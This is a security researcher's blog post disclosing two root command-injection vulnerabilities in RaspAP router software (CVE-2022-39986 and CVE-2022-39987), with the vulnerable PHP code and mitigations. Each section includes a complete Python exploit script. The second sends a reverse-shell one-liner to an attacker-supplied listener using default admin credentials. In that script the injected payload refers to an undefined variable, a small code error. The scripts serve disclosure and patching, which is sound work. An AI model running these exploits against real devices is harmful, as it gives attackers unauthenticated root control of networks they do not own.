[Open in app](https://rsci.app.link/?%24canonical_url=https%3A%2F%2Fmedium.com%2Fp%2F3c35e78809f2&%7Efeature=LoOpenInAppButton&%7Echannel=ShowPostUnderUser&source=---top_nav_layout_nav----------------------------------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40ismael0x00%2Fmultiple-vulnerabilities-in-raspap-3c35e78809f2&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

[Write](/m/signin?operation=register&redirect=https%3A%2F%2Fmedium.com%2Fnew-story&source=---top_nav_layout_nav-----------------------new_post_topnav-----------)

Sign up

[Sign in](/m/signin?operation=login&redirect=https%3A%2F%2Fmedium.com%2F%40ismael0x00%2Fmultiple-vulnerabilities-in-raspap-3c35e78809f2&source=post_page---top_nav_layout_nav-----------------------global_nav-----------)

![](https://miro.medium.com/v2/resize:fill:64:64/1*dmbNkD5D-u45r44go_cf0g.png)
# Multiple Vulnerabilities in RaspAP

[![Ismael0x00](https://miro.medium.com/v2/da:true/resize:fill:88:88/0*A6ol2MdREPoINevE)](/%40ismael0x00?source=post_page---byline--3c35e78809f2--------------------------------)

[Ismael0x00](/%40ismael0x00?source=post_page---byline--3c35e78809f2--------------------------------)

·

[Follow](/m/signin?actionUrl=https%3A%2F%2Fmedium.com%2F_%2Fsubscribe%2Fuser%2F473628ea22fc&operation=register&redirect=https%3A%2F%2Fmedium.com%2F%40ismael0x00%2Fmultiple-vulnerabilities-in-raspap-3c35e78809f2&user=Ismael0x00&userId=473628ea22fc&source=post_page-473628ea22fc--byline--3c35e78809f2---------------------post_header-----------)

3 min read·Jul 31, 2023

--

Listen

Share

![]()

[**RaspAP**](https://github.com/RaspAP/raspap-webgui) is an awesome feature-rich wireless router software that *just works* on many popular [Debian-based devices](https://github.com/RaspAP/raspap-webgui#supported-operating-systems), including the Raspberry Pi. It’s written in PHP, so while doing some code analysis I found some trivial bugs that can be used to get remote root RCE.

1. **Unauthenticated Command Injection as Root (CVE-2022–39986)**

Affected versions: **2.8.\* — 2.8.7**

A Command Injection vulnerability exists in “RaspAP web-gui” in the “cfg\_id” POST parameter at /ajax/openvpn/activate\_ovpncfg.php and /ajax/openvpn/del\_ovpncfg.php, the parameter is not sanitized. Note that while most endpoints on the application require a valid CSRF token, this endpoint does not. Since no other authentication mechanisms are securing this endpoint, the exploitation does not require any authentication and commands are executed as root.

[View code on Github](https://github.com/RaspAP/raspap-webgui/blob/2.8.7/ajax/openvpn/activate_ovpncfg.php)

```
....
if (isset($_POST['cfg_id'])) {  //
 $ovpncfg_id = $_POST['cfg_id']; // Here cfg_id is used without sanitization
 $ovpncfg_files = pathinfo(RASPI_OPENVPN_CLIENT_LOGIN, PATHINFO_DIRNAME).'/'.$ovpncfg_id.'_*.conf'; // then it's appended to a path
 exec("sudo rm $ovpncfg_files", $return); // exec sudo is called on the path
 ...
```

**PoC**

Just sending POST request with cfg\_id with crafted command gets us execution as sudo.

```
# Exploit Title: RaspAP - Remote Code Execution (RCE) (Unauthenticated)
# Date: Aug 2022
# CVE-ID: CVE-2022–39986
# Author: Ismael0x00 <https://twitter.com/ismael0x00>
# Vendor Homepage: https://raspap.com/
# Software Link: https://github.com/RaspAP/raspap-webgui
# Version: 2.8.0>=2.8.7
# Tested on: Linux raspberrypi 5.10.*

import requests
from requests.api import post
import sys, re

if len(sys.argv) != 4:
    print("python3 CVE-2022–39986.py <target-host> <target-port> <command>")
    sys.exit()
else:
    target_host = sys.argv[1]
    target_port = sys.argv[2]
    command = ";"+sys.argv[3]+";"

    endpoint = "ajax/openvpn/del_ovpncfg.php"
    url = "http://{}:{}/{}".format(target_host,target_port,endpoint)

    s = requests.Session()
    post_data = {
        "cfg_id": command
    }
    post_Request = s.post(url, data=post_data)
    if post_Request.status_code==200:
        print("[*] Sending command ... ")
        print(post_Request.text)
        print("Done")
    else:
     print("Error.["+post_Request.text+"]")
```

**Mitigation:**

> Update was release which [FIXED](https://github.com/RaspAP/raspap-webgui/commit/1fabc481690e008279113e18d0642c5279e3b56e#diff-873bd3ca12400188858e21e4192b9711fa18952529a0511fa14959acb69734c4) the bug by wrapping the parameter with PHP’s escapeshellarg().

2. **Authenticated Command Injection as Root(CVE-2022–39987)**

Affected versions: **2.8.\* — 2.9.2** (latest as of Jul 2023)

An Authenticated Command Injection vulnerability exists in “RaspAP’s web-gui” in the “**entity**” POST parameter in /ajax/networking/get\_wgkey.php.

When generating Private/Public key pairs it takes “entity” parameter from POST is not sanitized even though protected from unauthorized users, hence user with web access can ultimately execute commands as **root**. The parameter is passed as path which gets executed with exec(‘sudo path’).., therefor injected command gets executed as root.

[View Code on Github](https://github.com/RaspAP/raspap-webgui/blob/2.9.2/ajax/networking/get_wgkey.php)

```
...
$entity = $_POST['entity'];

if (isset($entity)) {

    // generate public/private key pairs for entity
    $pubkey = RASPI_WIREGUARD_PATH.$entity.'-public.key';
    $privkey = RASPI_WIREGUARD_PATH.$entity.'-private.key';
    $pubkey_tmp = '/tmp/'.$entity.'-public.key';
    $privkey_tmp = '/tmp/'.$entity.'-private.key';

    exec("sudo wg genkey | tee $privkey_tmp | wg pubkey > $pubkey_tmp", $return);
    $wgdata['pubkey'] = str_replace("\n",'',file_get_contents($pubkey_tmp));
    exec("sudo mv $privkey_tmp $privkey", $return);
    exec("sudo mv $pubkey_tmp $pubkey", $return);
...
```

**PoC**

Sending POST request with ***csrf token***(valid credential required) and crafted ‘***entity****’* parameter command gets us execution as sudo.

```
# Exploit Title: RaspAP - Remote Code Execution (RCE) (Authenticated)
# Date: Aug 2022
# CVE-ID: CVE-2022–39987
# Author: Ismael0x00 <https://twitter.com/ismael0x00>
# Vendor Homepage: https://raspap.com/
# Software Link: https://github.com/RaspAP/raspap-webgui
# Version: 2.8.0>=2.9.2
# Tested on: Linux raspberrypi 5.10.92

import requests
from requests.api import post
from requests.auth import HTTPBasicAuth
from bs4 import BeautifulSoup
import sys, re

if len(sys.argv) != 5:
    print("python3 CVE-2022–39987.py <target-host> <target-port> <reverse-host> <reverse-port>")
    sys.exit()
else:
    target_host = sys.argv[1]
    target_port = sys.argv[2]
    listener_host = sys.argv[3]
    listener_port = sys.argv[4]

    username = "admin"
    password = "secret"

    endpoint = "/ajax/networking/get_wgkey.php"
    command = f"python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"{listener_host}\",{listener_port}));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'"
    url = "http://{}:{}/{}".format(target_host,target_port,endpoint)

    s = requests.Session()

    get_Request = s.get(url, auth=HTTPBasicAuth(username, password))
    soup = BeautifulSoup(get_Request.text, "lxml")
    csrf_token = soup.find("meta",{"name":"csrf_token"}).get("content")

    post_data = {
        "csrf_token": csrf_token,
        "entity": "; {}".format(exploit)
    }
    post_Request = s.post(url, data=post_data, auth=HTTPBasicAuth(username, password))
    if post_Request.status_code:
        print("Reverse Shell sent.")
    else:
        print("Something went wrong.")
    print("Done")
```

Mitigation: Use PHP’s built-in escapeshellarg() to sanitize the parameter.

[Security](/tag/security?source=post_page-----3c35e78809f2--------------------------------)[Raspap](/tag/raspap?source=post_page-----3c35e78809f2--------------------------------)[Rasberry Pi](/tag/rasberry-pi?source=post_page-----3c35e78809f2--------------------------------)

--

--

[![Ismael0x00](https://miro.medium.com/v2/resize:fill:96:96/0*A6ol2MdREPoINevE)](/%40ismael0x00?source=post_page---post_author_info--3c35e78809f2--------------------------------)[![Ismael0x00](https://miro.medium.com/v2/resize:fill:128:128/0*A6ol2MdREPoINevE)](/%40ismael0x00?source=post_page---post_author_info--3c35e78809f2--------------------------------)Follow[## Written by Ismael0x00](/%40ismael0x00?source=post_page---post_author_info--3c35e78809f2--------------------------------)[2 Followers](/%40ismael0x00/followers?source=post_page---post_author_info--3c35e78809f2--------------------------------)·[1 Following](/%40ismael0x00/following?source=post_page---post_author_info--3c35e78809f2--------------------------------)Follow
## No responses yet

[Help](https://help.medium.com/hc/en-us?source=post_page-----3c35e78809f2--------------------------------)[Status](https://medium.statuspage.io/?source=post_page-----3c35e78809f2--------------------------------)[About](/about?autoplay=1&source=post_page-----3c35e78809f2--------------------------------)[Careers](/jobs-at-medium/work-at-medium-959d1a85284e?source=post_page-----3c35e78809f2--------------------------------)[Press](pressinquiries%40medium.com?source=post_page-----3c35e78809f2--------------------------------)[Blog](https://blog.medium.com/?source=post_page-----3c35e78809f2--------------------------------)[Privacy](https://policy.medium.com/medium-privacy-policy-f03bf92035c9?source=post_page-----3c35e78809f2--------------------------------)[Terms](https://policy.medium.com/medium-terms-of-service-9db0094a1e0f?source=post_page-----3c35e78809f2--------------------------------)[Text to speech](https://speechify.com/medium?source=post_page-----3c35e78809f2--------------------------------)[Teams](/business?source=post_page-----3c35e78809f2--------------------------------)

